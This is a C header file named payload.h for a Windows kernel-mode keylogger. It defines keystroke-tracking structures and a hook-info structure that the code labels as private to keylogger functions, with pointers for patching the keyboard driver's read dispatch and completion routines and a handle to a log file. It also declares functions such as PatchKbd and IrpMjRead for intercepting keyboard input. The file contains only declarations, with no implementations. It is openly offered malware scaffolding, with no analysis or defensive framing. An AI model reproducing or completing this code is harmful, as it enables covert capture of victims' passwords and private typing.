#ifndef _PAYLOAD_H_
#define _PAYLOAD_H_


typedef BOOLEAN BOOL;

typedef struct _KEY_STATE {
	BOOL kSHIFT; //if the shift key is pressed  
	BOOL kCAPSLOCK; //if the caps lock key is pressed down 
	BOOL kCTRL; //if the control key is pressed down 
	BOOL kALT; //if the alt key is pressed down 
} KEY_STATE, *PKEY_STATE;

//Instances of the structure will be chained onto a  
//linked list to keep track of the keyboard data 
//delivered by each irp for a single pressed key 
typedef struct _KEY_DATA {
	LIST_ENTRY ListEntry;
	char KeyData;
	char KeyFlags;
} KEY_DATA, *PKEY_DATA;

///Data private to keylogger functions
typedef struct _IRP_PATCH_INFO {
	PDRIVER_DISPATCH fpOriginalFunction;
	PDRIVER_DISPATCH fpHookFunction;
	PIO_COMPLETION_ROUTINE fpOriginalCompletionRoutine;
	PIO_COMPLETION_ROUTINE fpHookCompletionRoutine;
	HANDLE hLogFile;
	KEY_STATE kState;
	KSEMAPHORE queueSemaphore;
	KSPIN_LOCK queueSpinLock;
	LIST_ENTRY queueListHead;

	volatile BOOL wasPatched;
	volatile BOOL irpSentDown;
	volatile PDRIVER_OBJECT pKbdDrvObj;
	BOOL escKeyPressed;
	BOOL scrlKeyPressed;

} IRP_PATCH_INFO, *PIRP_PATCH_INFO;


PIRP_PATCH_INFO g_pKbdHookInfo;


void WorkerThread(PVOID pStartContext);
NTSTATUS IrpMjRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);
NTSTATUS IrpMjReadCompletion(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID pContext);
NTSTATUS PatchKbd(PVOID patchKbd);

#endif